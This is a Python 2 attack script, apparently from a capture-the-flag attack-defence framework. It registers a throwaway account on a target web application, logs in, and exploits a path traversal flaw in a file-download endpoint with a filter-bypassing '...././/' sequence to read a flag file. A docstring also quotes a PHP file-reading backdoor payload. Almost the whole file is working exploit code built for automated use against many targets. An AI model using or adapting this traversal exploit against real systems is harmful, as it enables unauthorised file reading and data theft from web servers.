#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        cmd = flag_path
        data = quote(cmd) 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
        print 'haozigege'
	res = shit(target,target_port)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
        if len(res) == 39:
            res = cmd_prefix + res + cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res

def shit(target,target_port):
    s = requests.Session()
    ip = target
    username = 'haozi' + str(randint(0,10000000))
    password = username
    email = username + '@haozi.com'
    url_1 = 'http://%s:%s/user/register.html' % (ip,str(target_port))
    url_2 = 'http://%s:%s/user/login.html' %(ip,str(target_port))
    url_3 = 'http://%s:%s/download/files.html?file=...././/...././/...././/...././/...././/...././/...././/flag/flag' %(ip,str(target_port))

    s.post(url_1,data={'username':username,'password':password,'email':email})
    s.post(url_2,data={'username':username,'password':password})
    flag = s.get(url_3).content.strip()
    print flag
    if len(flag)==39:
        debug_print(flag)
        print 'ok'
    else:
        flag = 'get flag error'
    
    return flag
